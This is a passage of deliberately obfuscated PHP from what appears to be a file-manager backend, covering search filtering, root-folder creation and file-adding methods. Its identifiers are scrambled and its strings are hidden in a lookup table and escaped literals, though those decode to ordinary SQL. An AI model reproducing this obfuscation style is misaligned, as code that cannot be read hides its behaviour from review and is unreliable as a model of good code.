$ŸŒÖ”èÒ = $ÜğçˆÕÔ[$ùñ†Üúì[1998]]; foreach ($Ä½°öÆÏ[$ùñ†Üúì[415]] as $Ä™ª’¤ì) { $Î†óÃ¨£ = $Ä™ª’¤ì[$ùñ†Üúì[32]]; $†¼À¤Ìâ = str_replace($ùñ†Üúì[53], $ùñ†Üúì[12], Pinyin::get($Î†óÃ¨£)); if (stripos($Î†óÃ¨£, $ŸŒÖ”èÒ) !== !1 || stripos($†¼À¤Ìâ, $ŸŒÖ”èÒ) !== !1) { $›“Šá¬‹[] = $Ä™ª’¤ì[$ùñ†Üúì[445]]; } } if (!$›“Šá¬‹) { return; } $´Ê¨¼ÛÆ = array($ùñ†Üúì[470] => array($ùñ†Üúì[7], $›“Šá¬‹), $ùñ†Üúì[1705] => 0, $ùñ†Üúì[33] => $ùñ†Üúì[2020] . $­òäë¯·); $õ…ôÄÂ€ = Model($ùñ†Üúì[472])->field($ùñ†Üúì[86])->where($´Ê¨¼ÛÆ)->select(); $õ…ôÄÂ€ = array_to_keyvalue($õ…ôÄÂ€, $ùñ†Üúì[12], $ùñ†Üúì[86]); $üä«ˆœ” = array_unique($õ…ôÄÂ€); $this->_listSearchMerge($½¹ÌíÚò, $ÜğçˆÕÔ, $×ÊÎ™‚, $üä«ˆœ”); } private function _listSearchMerge(&$úº›ñ‡, $€ï”Ä·, $æÂ¨ Á, $ÕÂß€Ã¤) { $Òµ³©õÄ =& $_SERVER[•Ùç É]; if (!$ÕÂß€Ã¤) { return; } $Ö·î¸§ = array_to_keyvalue($úº›ñ‡[$Òµ³©õÄ[415]], $Òµ³©õÄ[12], $Òµ³©õÄ[183]); $ ÕÂ˜ÙÂ = array_diff($ÕÂß€Ã¤, $Ö·î¸§); if (!$ ÕÂ˜ÙÂ) { return; } $©ÓÕ‹Í“ = array($Òµ³©õÄ[183] => array($Òµ³©õÄ[7], $ ÕÂ˜ÙÂ)); $ÉûĞ»™¨ = $this->field($æÂ¨ Á)->where($©ÓÕ‹Í“)->select(); if (!$ÉûĞ»™¨) { return; } $Ì™ÁñˆĞ = array(); foreach ($ÉûĞ»™¨ as $îíÖ°£€) { if ($this->_listSearchFilter($îíÖ°£€, $€ï”Ä·)) { $Ì™ÁñˆĞ[] = $îíÖ°£€; } } $úº›ñ‡[$Òµ³©õÄ[415]] = array_merge($Ì™ÁñˆĞ, $úº›ñ‡[$Òµ³©õÄ[415]]); $úº›ñ‡[$Òµ³©õÄ[412]][$Òµ³©õÄ[413]] += count($Ì™ÁñˆĞ); } private function _listSearchFilter($ÙœÜØòÙ, $é—İîô) { $­—¦ùÇš =& $_SERVER[•Ùç É]; $ñã¬Ùùú = $ÙœÜØòÙ[$­—¦ùÇš[455]] == $­—¦ùÇš[90]; if (!strstr($ÙœÜØòÙ[$­—¦ùÇš[555]], $­—¦ùÇš[50] . $é—İîô[$­—¦ùÇš[182]] . $­—¦ùÇš[50])) { return !1; } if (isset($é—İîô[$­—¦ùÇš[456]]) && $é—İîô[$­—¦ùÇš[456]] != $­—¦ùÇš[1959]) { if ($é—İîô[$­—¦ùÇš[456]] == $­—¦ùÇš[77] && !$ñã¬Ùùú) { return !1; } if ($é—İîô[$­—¦ùÇš[456]] != $­—¦ùÇš[77] && $ñã¬Ùùú) { return !1; } if (!strstr($ÙœÜØòÙ[$­—¦ùÇš[177]], $­—¦ùÇš[50] . $é—İîô[$­—¦ùÇš[456]] . $­—¦ùÇš[50])) { return !1; } } if (isset($é—İîô[$­—¦ùÇš[2167]]) && $é—İîô[$­—¦ùÇš[2167]] < $ÙœÜØòÙ[$­—¦ùÇš[78]]) { return !1; } if (isset($é—İîô[$­—¦ùÇš[2168]]) && $é—İîô[$­—¦ùÇš[2168]] > $ÙœÜØòÙ[$­—¦ùÇš[78]]) { return !1; } if (isset($é—İîô[$­—¦ùÇš[632]]) && $é—İîô[$­—¦ùÇš[632]] != $ÙœÜØòÙ[$­—¦ùÇš[499]]) { return !1; } return !0; } public function listSearchChildren($Ë¶±¶Ü, $âß¡ƒ«® = 5000) { $Â¿éÁÏ° =& $_SERVER[•Ùç É]; $‹úä¿İí = array(); $×œğéÜ = $this->sourceInfo($Ë¶±¶Ü); $–áú¹ƒ¿ = array($Â¿éÁÏ°[555] => array($Â¿éÁÏ°[429], $×œğéÜ[$Â¿éÁÏ°[555]] . $×œğéÜ[$Â¿éÁÏ°[183]] . $Â¿éÁÏ°[583])); $‡ÛÚ•º = $this->field($Â¿éÁÏ°[78])->where($–áú¹ƒ¿)->limit($âß¡ƒ«® + 1)->select(); $Ñ€ëÍîã = is_array($‡ÛÚ•º) ? count($‡ÛÚ•º) : 0; if ($Ñ€ëÍîã > $âß¡ƒ«®) { return $this->_listSearchChildrenNear($Ë¶±¶Ü, $âß¡ƒ«®); } $Ä±é “å = $this->field($Â¿éÁÏ°[183])->where($–áú¹ƒ¿)->select(); $‹úä¿İí = array_to_keyvalue($Ä±é “å, $Â¿éÁÏ°[12], $Â¿éÁÏ°[183]); return $‹úä¿İí; } private function _listSearchChildrenNear($Íş¸§ª, $ı‘Â£‡Ÿ) { $ß¿ˆ¦¤ =& $_SERVER[•Ùç É]; $İ¬ŞÂé© = array(); $Ìá­ŸŠç = array($ß¿ˆ¦¤[182] => $Íş¸§ª); $ô©ÓÖıù = $this->field($ß¿ˆ¦¤[2169])->where($Ìá­ŸŠç)->select(); $†´·¦Ì = array_to_keyvalue(array_filter_by_field($ô©ÓÖıù, $ß¿ˆ¦¤[455], $ß¿ˆ¦¤[90]), $ß¿ˆ¦¤[12], $ß¿ˆ¦¤[183]); $İ¬ŞÂé© = array_merge($İ¬ŞÂé©, array_to_keyvalue($ô©ÓÖıù, $ß¿ˆ¦¤[12], $ß¿ˆ¦¤[183])); if (!$†´·¦Ì) { return $İ¬ŞÂé©; } $Ìá­ŸŠç = array($ß¿ˆ¦¤[182] => array($ß¿ˆ¦¤[7], $†´·¦Ì)); $ô©ÓÖıù = $this->field($ß¿ˆ¦¤[2169])->where($Ìá­ŸŠç)->limit($ı‘Â£‡Ÿ)->select(); $İ¬ŞÂé© = array_merge($İ¬ŞÂé©, array_to_keyvalue($ô©ÓÖıù, $ß¿ˆ¦¤[12], $ß¿ˆ¦¤[183])); $İ¬ŞÂé© = array_slice($İ¬ŞÂé©, 0, intval($ı‘Â£‡Ÿ)); return $İ¬ŞÂé©; } private function _listSearchBindPinyin($äÒÂÃ¬, &$éÙØÉš, &$Š—ó‚¿‡) { $¬·á×ôğ =& $_SERVER[•Ùç É]; if (!isset($äÒÂÃ¬[$¬·á×ôğ[1998]]) || !$äÒÂÃ¬[$¬·á×ôğ[1998]]) { return; } if (!Input::check($äÒÂÃ¬[$¬·á×ôğ[1998]], $¬·á×ôğ[364]) || strlen($äÒÂÃ¬[$¬·á×ôğ[1998]]) < 2) { return; } $Á´ ß›ô = "\x4c\105\x46\124\40\x4a\x4f\111\x4e\x20{$this->tablePrefix}\151\x6f\x5f\x73\x6f\x75\162\143\145\137\x6d\145\164\x61\x20\x6d\x65\164\x61\x20\x6f\156\40\x73\x6f\x75\x72\x63\x65\56\163\157\165\x72\x63\x65\111\x44\x20\x3d\x20\x6d\x65\x74\x61\56\x73\x6f\165\x72\x63\145\111\104"; $îÉäîş÷ = array(); $Š—ó‚¿‡ = str_replace(array($¬·á×ôğ[248], $¬·á×ôğ[53], $¬·á×ôğ[2170]), $¬·á×ôğ[12], $Š—ó‚¿‡); $Š—ó‚¿‡ = $¬·á×ôğ[481] . str_replace($¬·á×ôğ[50], $¬·á×ôğ[482], $Š—ó‚¿‡); $áÄ¾şìœ = $éÙØÉš[$¬·á×ôğ[32]]; unset($éÙØÉš[$¬·á×ôğ[32]]); foreach ($éÙØÉš as $ÕŒÅÎ“§ => $ãÅÓŸÃ˜) { $îÉäîş÷[$¬·á×ôğ[481] . $ÕŒÅÎ“§] = $ãÅÓŸÃ˜; } foreach ($áÄ¾şìœ as $™î¹‹ä÷) { $îÉäîş÷[] = array($¬·á×ôğ[486] => $™î¹‹ä÷, $¬·á×ôğ[1051] => $¬·á×ôğ[2002], array($¬·á×ôğ[2171] => $™î¹‹ä÷, $¬·á×ôğ[2172] => array($¬·á×ôğ[7], array($¬·á×ôğ[508], $¬·á×ôğ[507])))); } $this->join($Á´ ß›ô); $éÙØÉš = $îÉäîş÷; } private function _parseSearchWhere($˜ù—èıõ) { $ÊÍ²€—ƒ =& $_SERVER[•Ùç É]; $€Õ ˜ÕÑ = array(); if (isset($˜ù—èıõ[$ÊÍ²€—ƒ[805]]) && $˜ù—èıõ[$ÊÍ²€—ƒ[805]]) { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[87]] = array($ÊÍ²€—ƒ[2173], $˜ù—èıõ[$ÊÍ²€—ƒ[805]]); } if (isset($˜ù—èıõ[$ÊÍ²€—ƒ[806]]) && $˜ù—èıõ[$ÊÍ²€—ƒ[806]]) { $ÀÎÌ¦»‡ = array($ÊÍ²€—ƒ[2174], $˜ù—èıõ[$ÊÍ²€—ƒ[806]]); if ($€Õ ˜ÕÑ[$ÊÍ²€—ƒ[87]]) { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[87]] = array($€Õ ˜ÕÑ[$ÊÍ²€—ƒ[87]], $ÀÎÌ¦»‡, $ÊÍ²€—ƒ[2175]); } else { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[87]] = $ÀÎÌ¦»‡; } } if (isset($˜ù—èıõ[$ÊÍ²€—ƒ[2167]]) && $˜ù—èıõ[$ÊÍ²€—ƒ[2167]] > 0) { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[78]] = array($ÊÍ²€—ƒ[2173], $˜ù—èıõ[$ÊÍ²€—ƒ[2167]]); } if (isset($˜ù—èıõ[$ÊÍ²€—ƒ[2168]]) && $˜ù—èıõ[$ÊÍ²€—ƒ[2168]]) { $ÀÎÌ¦»‡ = array($ÊÍ²€—ƒ[2174], $˜ù—èıõ[$ÊÍ²€—ƒ[2168]]); if ($€Õ ˜ÕÑ[$ÊÍ²€—ƒ[78]]) { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[78]] = array($€Õ ˜ÕÑ[$ÊÍ²€—ƒ[78]], $ÀÎÌ¦»‡, $ÊÍ²€—ƒ[2175]); } else { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[78]] = $ÀÎÌ¦»‡; } } if (isset($˜ù—èıõ[$ÊÍ²€—ƒ[632]]) && $˜ù—èıõ[$ÊÍ²€—ƒ[632]]) { $€Õ ˜ÕÑ[] = array($ÊÍ²€—ƒ[499] => $˜ù—èıõ[$ÊÍ²€—ƒ[632]], $ÊÍ²€—ƒ[497] => $˜ù—èıõ[$ÊÍ²€—ƒ[632]], $ÊÍ²€—ƒ[1051] => $ÊÍ²€—ƒ[2002]); } if (isset($˜ù—èıõ[$ÊÍ²€—ƒ[456]]) && $˜ù—èıõ[$ÊÍ²€—ƒ[456]]) { $¾†ÖşèÖ = $˜ù—èıõ[$ÊÍ²€—ƒ[456]]; if ($¾†ÖşèÖ == $ÊÍ²€—ƒ[77]) { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[455]] = 1; } else { if ($¾†ÖşèÖ == $ÊÍ²€—ƒ[2176]) { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[455]] = 0; } else { if ($¾†ÖşèÖ) { $¾†ÖşèÖ = is_array($¾†ÖşèÖ) ? $¾†ÖşèÖ : explode($ÊÍ²€—ƒ[50], $¾†ÖşèÖ); $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[456]] = array($ÊÍ²€—ƒ[462], $¾†ÖşèÖ); $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[455]] = 0; } } } } $this->_parseSearchParent($˜ù—èıõ, $€Õ ˜ÕÑ); if (isset($˜ù—èıõ[$ÊÍ²€—ƒ[1998]]) && trim($˜ù—èıõ[$ÊÍ²€—ƒ[1998]])) { $æÅäÕ®Ş = trim($˜ù—èıõ[$ÊÍ²€—ƒ[1998]]); $ÜÚÓüëñ = explode($ÊÍ²€—ƒ[53], $æÅäÕ®Ş); if (strlen($æÅäÕ®Ş) > 2 && (substr($æÅäÕ®Ş, 0, 1) == $ÊÍ²€—ƒ[120] && substr($æÅäÕ®Ş, -1) == $ÊÍ²€—ƒ[120]) || substr($æÅäÕ®Ş, 0, 1) == $ÊÍ²€—ƒ[58] && substr($æÅäÕ®Ş, -1) == $ÊÍ²€—ƒ[58]) { $æÅäÕ®Ş = substr($æÅäÕ®Ş, 1, -1); $ÜÚÓüëñ = array($æÅäÕ®Ş); } $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[32]] = array(array($ÊÍ²€—ƒ[582], $ÊÍ²€—ƒ[2000] . $æÅäÕ®Ş . $ÊÍ²€—ƒ[2000])); if (count($ÜÚÓüëñ) > 1) { $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[32]] = array(); foreach ($ÜÚÓüëñ as $Ïş††™ú) { if (!trim($Ïş††™ú)) { continue; } $€Õ ˜ÕÑ[$ÊÍ²€—ƒ[32]][] = array($ÊÍ²€—ƒ[582], $ÊÍ²€—ƒ[2000] . trim($Ïş††™ú) . $ÊÍ²€—ƒ[2000]); } } } return $€Õ ˜ÕÑ; } private function _parseSearchParent($Î¡íÓœ, &$ø¶îÛ) { $«øÃ·® =& $_SERVER[•Ùç É]; if (!isset($Î¡íÓœ[$«øÃ·®[182]]) || !$Î¡íÓœ[$«øÃ·®[182]]) { return; } $¶í¿ıÌ÷ = $this->pathInfo($Î¡íÓœ[$«øÃ·®[182]]); $¸Ä»Ş ø = $¶í¿ıÌ÷[$«øÃ·®[182]] . $«øÃ·®[12] === $«øÃ·®[214]; $¤ò½Äà = $¶í¿ıÌ÷[$«øÃ·®[180]] == $«øÃ·®[549]; if ($¶í¿ıÌ÷[$«øÃ·®[566]] == $«øÃ·®[567]) { $Šëö§Ã« = $this->sourceInfo($Î¡íÓœ[$«øÃ·®[182]]); $¶í¿ıÌ÷[$«øÃ·®[555]] = $Šëö§Ã«[$«øÃ·®[555]]; } $ø¶îÛ[$«øÃ·®[622]] = array($«øÃ·®[582], $¶í¿ıÌ÷[$«øÃ·®[555]] . $Î¡íÓœ[$«øÃ·®[182]] . $«øÃ·®[583]); $†©«ğ“è = isset($Î¡íÓœ[$«øÃ·®[1863]]) && in_array($«øÃ·®[549], $Î¡íÓœ[$«øÃ·®[1863]]); if (!$†©«ğ“è || !$¤ò½Äà || !$¸Ä»Ş ø || !$¶í¿ıÌ÷[$«øÃ·®[457]]) { return; } if (!AuthModel::authCheckRoot($¶í¿ıÌ÷[$«øÃ·®[457]][$«øÃ·®[458]])) { return; } $ÜïïÍæÅ = $¶í¿ıÌ÷[$«øÃ·®[540]] . $«øÃ·®[12]; if ($ÜïïÍæÅ == $«øÃ·®[90]) { unset($ø¶îÛ[$«øÃ·®[622]]); $ø¶îÛ[$«øÃ·®[180]] = self::TYPE_GROUP; return; } $äãˆŞ¯¢ = Model($«øÃ·®[556])->groupChildrenAll($ÜïïÍæÅ); $Éœ’î¬× = count($äãˆŞ¯¢); if ($Éœ’î¬× <= 1) { return; } $åï”Éãè = array($«øÃ·®[182] => 0, $«øÃ·®[180] => self::TYPE_GROUP, $«øÃ·®[540] => array($«øÃ·®[7], $äãˆŞ¯¢)); $èÓã”©¿ = $this->field($«øÃ·®[2177])->where($åï”Éãè)->limit($Éœ’î¬×)->select(); $ø¶îÛ[$«øÃ·®[622]] = array(); foreach ($èÓã”©¿ as $Œ¦×½å¡) { $ø¶îÛ[$«øÃ·®[622]][] = array($«øÃ·®[582], $«øÃ·®[565] . $Œ¦×½å¡[$«øÃ·®[183]] . $«øÃ·®[583]); } $ø¶îÛ[$«øÃ·®[622]][] = $«øÃ·®[2002]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Ú§ÎÚ›) { $ô«Ğ—¶÷ =& $_SERVER[•Ùç É]; $²×‘Á¡ = Model($ô«Ğ—¶÷[548])->where(array($ô«Ğ—¶÷[1696] => $Ú§ÎÚ›))->find(); $¯ô¤àÕ¿ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ú§ÎÚ›, $²×‘Á¡[$ô«Ğ—¶÷[32]]); $this->userDesktopAdd($¯ô¤àÕ¿); return $¯ô¤àÕ¿; } public function userDesktopAdd($¶ÀÈ„÷×) { $íêö¤–Å =& $_SERVER[•Ùç É]; $şö¨æ· = LNG($íêö¤–Å[2178]); $†êâ«‚« = $this->mkdir($¶ÀÈ„÷×, $şö¨æ·); $this->metaSet($†êâ«‚«, $íêö¤–Å[2179], $íêö¤–Å[90]); $this->metaSet($¶ÀÈ„÷×, $íêö¤–Å[2180], $†êâ«‚«); } public function userPathSafeAdd($²Ã¸ ) { $ã­İ·’ø =& $_SERVER[•Ùç É]; $¥Èœğä = Model($ã­İ·’ø[548])->getInfoFull($²Ã¸ ); if (!$¥Èœğä) { return !1; } if (_get($¥Èœğä, $ã­İ·’ø[570])) { return $¥Èœğä[$ã­İ·’ø[509]][$ã­İ·’ø[2181]]; } $ƒ¨¥´º— = $this->_mkdirRoot(SourceModel::TYPE_USER, $²Ã¸ , $ã­İ·’ø[2182], $ã­İ·’ø[476]); Model($ã­İ·’ø[548])->metaSet($²Ã¸ , $ã­İ·’ø[2181], $ƒ¨¥´º—); $this->metaSet($ƒ¨¥´º—, $ã­İ·’ø[2183], $²Ã¸ ); return $ƒ¨¥´º—; } public function groupRootAdd($øù´¦•î) { $ö×ôÍ¯£ =& $_SERVER[•Ùç É]; $“ûŸøÊ¥ = Model($ö×ôÍ¯£[556])->where(array($ö×ôÍ¯£[1992] => $øù´¦•î))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $øù´¦•î, $“ûŸøÊ¥[$ö×ôÍ¯£[32]]); } public function systemRootPathAdd($¿“åÇĞ¯) { if ($¿“åÇĞ¯ != $_SERVER[•Ùç É][576]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¿“åÇĞ¯); } public function userRootRemove($ßş¸Şé) { $“‰Ë¼ê = $this->targetSourceRoot(SourceModel::TYPE_USER, $ßş¸Şé, !0); foreach ($“‰Ë¼ê as $Á·¾´¨) { if (!$Á·¾´¨) { continue; } $this->remove($Á·¾´¨[$_SERVER[•Ùç É][183]], !1); } } public function groupRootRemove($¼Ì¹ï¾µ) { $¢²ı†È­ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $¼Ì¹ï¾µ); if (!$¢²ı†È­) { return; } $this->remove($¢²ı†È­[$_SERVER[•Ùç É][183]], !1); } private function _mkdirRoot($ÌÎñ¥Ã¤, $ åÇäÇœ, $††ù¥Ä, $ı°ğÁË× = '') { $Î›ÙÈšÆ =& $_SERVER[•Ùç É]; $›é·³§ = defined($Î›ÙÈšÆ[2126]) ? USER_ID : 0; $™Ú€êØ£ = array($Î›ÙÈšÆ[447] => 0, $Î›ÙÈšÆ[618] => $ÌÎñ¥Ã¤, $Î›ÙÈšÆ[619] => $ åÇäÇœ, $Î›ÙÈšÆ[616] => 1, $Î›ÙÈšÆ[620] => $›é·³§, $Î›ÙÈšÆ[621] => $›é·³§, $Î›ÙÈšÆ[617] => $ı°ğÁË×, $Î›ÙÈšÆ[622] => $Î›ÙÈšÆ[565], $Î›ÙÈšÆ[474] => 0, $Î›ÙÈšÆ[587] => 0, $Î›ÙÈšÆ[512] => 0, $Î›ÙÈšÆ[623] => $Î›ÙÈšÆ[12]); if ($Ïµ×ÑÍ‡ = $this->where($™Ú€êØ£)->find()) { return $Ïµ×ÑÍ‡[$Î›ÙÈšÆ[183]]; } $ø®¿à¦€ = "\115\x6f\144\145\154\x53\x6f\x75\x72\x63\145\x2e\x6d\x6b\144\151\162\122\157\157\164\56{$ÌÎñ¥Ã¤}\56{$ åÇäÇœ}\56" . $††ù¥Ä; CacheLock::lock($ø®¿à¦€); $™Ú€êØ£[$Î›ÙÈšÆ[32]] = $††ù¥Ä; $óÕ¤ÒŸ = $this->add($™Ú€êØ£); $—„ğÍÈ = array($Î›ÙÈšÆ[624] => short_id($óÕ¤ÒŸ)); $this->where(array($Î›ÙÈšÆ[461] => $óÕ¤ÒŸ))->save($—„ğÍÈ); CacheLock::unlock($ø®¿à¦€); return $óÕ¤ÒŸ; } private function targetSourceRoot($¨ı®Øâ, $ù‹•©, $ÕÖšú¿÷ = false) { $É‹ÕÄÓ‘ =& $_SERVER[•Ùç É]; $êŞñıÄ = array($É‹ÕÄÓ‘[447] => 0, $É‹ÕÄÓ‘[618] => $¨ı®Øâ, $É‹ÕÄÓ‘[619] => $ù‹•©); if ($ÕÖšú¿÷) { $›ºæğ§‰ = $this->where($êŞñıÄ)->select(); return $›ºæğ§‰ ? $›ºæğ§‰ : array(); } $šïŠ³ = $this->where($êŞñıÄ)->find(); return $šïŠ³ ? $šïŠ³ : array(); } public function sourceRootGroup($ºéšÓ«Ì) { $œ°ÉìÛ =& $_SERVER[•Ùç É]; if (is_string($ºéšÓ«Ì)) { $ºéšÓ«Ì = array($ºéšÓ«Ì); } $—¯ãâ¯ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ºéšÓ«Ì, $œ°ÉìÛ[205]); $ŠÇöÉÓ” = array($œ°ÉìÛ[415] => $—¯ãâ¯, $œ°ÉìÛ[412] => array($œ°ÉìÛ[803] => count($ºéšÓ«Ì))); $this->_listDataApply($ŠÇöÉÓ”[$œ°ÉìÛ[415]]); $this->_listMake($ŠÇöÉÓ”); return array_to_keyvalue($ŠÇöÉÓ”[$œ°ÉìÛ[84]], $œ°ÉìÛ[540]); } public function mkfile($äºŒëõ÷, $œæ‚â, $±Ÿå¡¬Ì = '', $Àßßâ† = REPEAT_RENAME) { $“¢Èñ‡î =& $_SERVER[•Ùç É]; $ØØ‚°ó = Model($“¢Èñ‡î[644])->addFileByContent($±Ÿå¡¬Ì, $œæ‚â); return $this->_createFileCall($äºŒëõ÷, $œæ‚â, $ØØ‚°ó, $Àßßâ†, $“¢Èñ‡î[1394]); } public function addFile($’©Œà‡, $á¯Ú¼«³, $íËˆÊšü, $ÔÂ§¼‰Æ = false, $ß“Œšà‹ = REPEAT_RENAME) { $×¹íĞ“¤ = Model($_SERVER[•Ùç É][644])->addFile($á¯Ú¼«³, $íËˆÊšü, $ÔÂ§¼‰Æ); return $this->_createFileCall($’©Œà‡, $íËˆÊšü, $×¹íĞ“¤, $ß“Œšà‹); } public function addFileByFileID($¡îÙ“û, $ù—óÔÀ¤, $äÅ‰ñù, $ÊÊ€À’Ş = REPEAT_RENAME) { $¶ó­‹ˆ‘ =& $_SERVER[•Ùç É]; $ŸÍ±›ÚŒ = Model($¶ó­‹ˆ‘[644])->find($ù—óÔÀ¤); Model($¶ó­‹ˆ‘[644])->linkAdd($ù—óÔÀ¤); return $this->_createFileCall($¡îÙ“û, $äÅ‰ñù, $ŸÍ±›ÚŒ, $ÊÊ€À’Ş); } public function addFileByRemote($õÄµÔƒº, $ö¨ó«ú, $™«ôü¦, $³´à¼Ô = array(), $¢÷¼Éä½ = REPEAT_RENAME) { $’ÄÒ¨™’ = Model($_SERVER[•Ùç É][644])->addFileByRemote($ö¨ó«ú, $™«ôü¦, $³´à¼Ô); return $this->_createFileCall($õÄµÔƒº, $™«ôü¦, $’ÄÒ¨™’, $¢÷¼Éä½); } private function _createFileCall($ã½ÎÖ±¶, $š½¯û»§, $í˜‹‘ƒÑ, $°©Ñ¡¹, $Ï¸éƒ«ê = "\x75\160\154\157\141\x64") { $ËœÎ¼ÅÅ =& $_SERVER[•Ùç É]; $öäİê¨” = !1; $this->setMasterDB(); $this->lockWriteStart($ã½ÎÖ±¶, $š½¯û»§); $œ©‹òÅ = $this->fileNameExist($ã½ÎÖ±¶, $š½¯û»§); $ÛÙâ¿¯¥ = $this->_createFile($ã½ÎÖ±¶, $š½¯û»§, $í˜‹‘ƒÑ, $°©Ñ¡¹, $öäİê¨”); if (!$öäİê¨”) { Model($ËœÎ¼ÅÅ[514])->remove($í˜‹‘ƒÑ[$ËœÎ¼ÅÅ[511]]); } if ($öäİê¨” && $ÛÙâ¿¯¥ && $ÛÙâ¿¯¥ != $œ©‹òÅ) { Model($ËœÎ¼ÅÅ[2151])->eventCreate($ÛÙâ¿¯¥, $Ï¸éƒ«ê); } $this->lockWriteEnd($ã½ÎÖ±¶, $š½¯û»§); return $ÛÙâ¿¯¥; } public function mkdir($¸ç³ú«”, $˜˜Üòåß, $›Ñ—ÂÚ = REPEAT_SKIP) { $·ƒÁˆ¨ =& $_SERVER[•Ùç É]; $this->setMasterDB(); $õ„ñ¿ÍÂ = $this->sourceInfo($¸ç³ú«”); if (!$õ„ñ¿ÍÂ) { return !1; } $this->lockWriteStart($¸ç³ú«”, $˜˜Üòåß); if ($›Ñ—ÂÚ !== !1) { $†Î¢òÛ‚ = $this->fileNameExist($¸ç³ú«”, $˜˜Üòåß); if ($†Î¢òÛ‚ && $›Ñ—ÂÚ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($¸ç³ú«”, $˜˜Üòåß); return $†Î¢òÛ‚; } $˜˜Üòåß = $this->fileNameAuto($¸ç³ú«”, $˜˜Üòåß, $›Ñ—ÂÚ); } $“‰’³ï’ = array($·ƒÁˆ¨[616] => 1, $·ƒÁˆ¨[464] => $˜˜Üòåß, $·ƒÁˆ¨[617] => $·ƒÁˆ¨[12], $·ƒÁˆ¨[512] => 0, $·ƒÁˆ¨[587] => 0); $–¢¥¾şÌ = $this->_addSource($“‰’³ï’, $õ„ñ¿ÍÂ); Model($·ƒÁˆ¨[2151])->eventCreate($–¢¥¾şÌ, $·ƒÁˆ¨[1395]); $this->lockWriteEnd($¸ç³ú«”, $˜˜Üòåß); return $–¢¥¾şÌ; } public function listSourceRoot($Ä¥Ñƒ“Â, $âô¶ĞÏÅ, $˜áµÅ = "\x73\157\165\162\x63\145\111\104\54\164\x61\162\147\x65\x74\x49\104\x2c\x73\x69\x7a\145") { $ñÀ®†œÀ =& $_SERVER[•Ùç É]; $“ÆÁ¯ş = $ñÀ®†œÀ[424]; $´Õ®’ş¢ = array(); $úŸ¦–İ = 1024 * 50; $½ƒ…¦‰Ç = is_array($½ƒ…¦‰Ç) ? $½ƒ…¦‰Ç : array(); $ÚöÓ‚…“ = count($âô¶ĞÏÅ); $ü‡×â’ = $this->tablePrefix . $ñÀ®†œÀ[2184]; for ($‹¡ú–Ùı = 0; $‹¡ú–Ùı < $ÚöÓ‚…“; $‹¡ú–Ùı++) { $Ô¼²ÄŠ = $âô¶ĞÏÅ[$‹¡ú–Ùı]; $“ÆÁ¯ş .= "\x53\105\x4c\105\103\124\x20\x2a\x20\106\122\117\115\x20\x28\x53\x45\114\105\x43\124\x20{$˜áµÅ}\x20\x46\x52\x4f\115\x20\x60{$ü‡×â’}\140\40\127\x48\x45\x52\x45\40"; $“ÆÁ¯ş .= "\x60\x70\x61\162\145\156\x74\111\104\x60\x3d\60\40\101\116\104\x20\140\x74\141\x72\147\145\164\x49\x44\140\x3d{$Ô¼²ÄŠ}\x20\x41\x4e\104\40\x60\x74\141\x72\x67\x65\164\124\171\160\145\x60\75{$Ä¥Ñƒ“Â}\x20\x61\156\144\40\x66\151\154\145\x54\x79\x70\x65\75\x27\47\40\x6c\x69\155\x69\x74\x20\61\x29\40\141\163\x20\x74\x62\137{$‹¡ú–Ùı}\x20\x55\116\111\x4f\116\x20\101\x4c\x4c\x20"; if ((strlen($“ÆÁ¯ş) >= $úŸ¦–İ || $‹¡ú–Ùı == $ÚöÓ‚…“ - 1) && $“ÆÁ¯ş) { $“ÆÁ¯ş = substr($“ÆÁ¯ş, 0, -strlen($ñÀ®†œÀ[1089])); $ùÊÖÜÕé = $this->query($“ÆÁ¯ş); $“ÆÁ¯ş = $ñÀ®†œÀ[12]; $´Õ®’ş¢ = array_merge($´Õ®’ş¢, $ùÊÖÜÕé); } } return $´Õ®’ş¢; } private function _createFile($øÂ•½æˆ, $’¥Àİğ´, $‡¸ÈÄì¬, $—ÁşÛ¤ı, &$¥à‚¬ğğ) { $£Ï­È†µ =& $_SERVER[•Ùç É]; $Ù„šÛŠ = $this->sourceInfo($øÂ•½æˆ); if (!$‡¸ÈÄì¬ || !$Ù„šÛŠ) { return !1; } if ($—ÁşÛ¤ı !== !1) { $ç‚«…ô = $this->fileNameExist($øÂ•½æˆ, $’¥Àİğ´); } $¥à‚¬ğğ = !0; if ($—ÁşÛ¤ı && $ç‚«…ô) { if ($—ÁşÛ¤ı == REPEAT_SKIP) { $¥à‚¬ğğ = !1; return $ç‚«…ô; } else { if ($—ÁşÛ¤ı == REPEAT_REPLACE) { $¿‘‚ÒÏÊ = $this->sourceInfo($ç‚«…ô); $Œ®²ù—Ñ = $this->fileHistory($¿‘‚ÒÏÊ, $‡¸ÈÄì¬[$£Ï­È†µ[511]], $‡¸ÈÄì¬[$£Ï­È†µ[78]]); if (!$Œ®²ù—Ñ) { $¥à‚¬ğğ = !1; } else { $this->folderSizeReset($øÂ•½æˆ); } return $ç‚«…ô; } else { $’¥Àİğ´ = $this->fileNameAuto($øÂ•½æˆ, $’¥Àİğ´, $—ÁşÛ¤ı, !1); } } } $Óºş¶á = array($£Ï­È†µ[616] => 0, $£Ï­È†µ[464] => $’¥Àİğ´, $£Ï­È†µ[617] => substr(get_path_ext($’¥Àİğ´), 0, 10), $£Ï­È†µ[512] => $‡¸ÈÄì¬[$£Ï­È†µ[511]], $£Ï­È†µ[587] => $‡¸ÈÄì¬[$£Ï­È†µ[78]]); $Òª ŸÈç = $this->_addSource($Óºş¶á, $Ù„šÛŠ); $this->folderSizeReset($øÂ•½æˆ, 